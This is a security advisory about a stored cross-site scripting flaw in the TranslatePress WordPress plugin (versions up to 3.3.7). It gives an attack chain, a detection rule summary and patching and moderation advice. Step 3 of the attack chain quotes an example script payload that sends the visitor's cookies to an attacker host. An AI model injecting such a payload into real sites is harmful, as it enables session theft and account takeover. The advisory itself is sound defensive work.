---
title: Stored Cross-Site Scripting in TranslatePress WordPress Plugin
slug: 2026-10-translatepress-xss
description: The TranslatePress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the comment parameter, allowing unauthenticated attackers to execute arbitrary web scripts.
date: "2026-10-16T08:25:15Z"
type: advisory
types:
  - advisory
severities:
  - high
cpes:
  - cpe:2.3:a:translatepress:translatepress:*:*:*:*:*:wordpress:*:*
vendors:
  - TranslatePress
products:
  - TranslatePress – Translate Multilingual sites with AI Translation (<= 3.3.7)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: Unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.007
    technique_name: 'Command and Scripting Interpreter: JavaScript'
    evidence: This makes it possible for unauthenticated attackers to inject arbitrary web scripts.
    confidence_band: high
cves:
  - id: CVE-2026-107768
    cvss: 7.2
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-107768
rules:
  - title: Detect CVE-2026-107768 Exploitation - Stored XSS via Comment Submission
    description: Detects potential exploitation attempts of CVE-2026-107768 by identifying HTTP POST requests to WordPress comment endpoints containing common XSS script tags.
    platform: sigma
    severity: high
    tactics:
      - execution
      - initial_access
    techniques:
      - T1059.007
    data_sources:
      - webserver
rules_count: 1
action_plan:
  priority: elevated
  owners:
    - SOC
    - IT Operations
  immediate_actions:
    - action: Patch TranslatePress plugin to the latest version (v3.3.8 or higher)
      owner: IT Operations
      due: 24h
      evidence: Source states versions <= 3.3.7 are vulnerable.
  mitigation_plan:
    - priority: immediate
      action: Enable strict comment moderation in WordPress settings
      owner: IT Operations
      addresses: CVE-2026-107768
      evidence: Exploitation requires the target site to allow unmoderated comment submission.
---

The TranslatePress - Translate Multilingual sites with AI Translation plugin for WordPress is affected by a Stored Cross-Site Scripting (XSS) vulnerability, tracked as CVE-2026-107768. All versions up to and including 3.3.7 are susceptible to this flaw, which stems from insufficient input sanitization and output escaping within the comment parameter. An unauthenticated attacker can leverage this vulnerability to inject arbitrary JavaScript into comments. This malicious script subsequently executes in the browser of any user - including administrators - who views the page where the injected comment is displayed. The vulnerability is highly relevant to defenders as it requires the site to have a secondary language configured and allow unmoderated comment submissions, which aligns with common configurations for multilingual WordPress deployments. Successful exploitation could lead to administrative account takeover via session hijacking or the redirection of site visitors to malicious domains.

## Attack Chain

1. Attacker identifies a WordPress site running a vulnerable version of TranslatePress (<= 3.3.7).
2. Attacker verifies the target site has a secondary language enabled and allows unmoderated comment submissions.
3. Attacker crafts a malicious payload containing JavaScript, such as '&lt;script>fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script>'.
4. Attacker submits the payload through the standard WordPress comment form on a public-facing post.
5. The TranslatePress plugin processes the comment, failing to sanitize the malicious script within the comment parameter.
6. The WordPress database stores the unsanitized script as part of the comment content.
7. A legitimate user, such as an administrator, visits the affected page where the comment is rendered.
8. The user's browser executes the stored JavaScript, leading to potential session theft or unauthorized actions on behalf of the user.

## Impact

Successful exploitation of CVE-2026-107768 allows for the execution of arbitrary JavaScript in the context of a victim's session. Depending on the target's role, this can result in the full compromise of user accounts, theft of sensitive session cookies, or the defacement of the affected website. Because the payload is stored persistently, it may affect any user visiting the page, increasing the overall risk to the organization's user base and administrative environment.

## Recommendation

1. Update the TranslatePress plugin to the latest available version (beyond 3.3.7) immediately to remediate the lack of input sanitization.
2. Monitor web server logs for HTTP POST requests directed at comment submission endpoints that contain script tags or suspicious JavaScript patterns.
3. Enforce comment moderation policies to prevent unauthenticated users from posting content directly to public-facing pages without verification.
4. Implement a strict Content Security Policy (CSP) to restrict the execution of unauthorized scripts within the browser context.
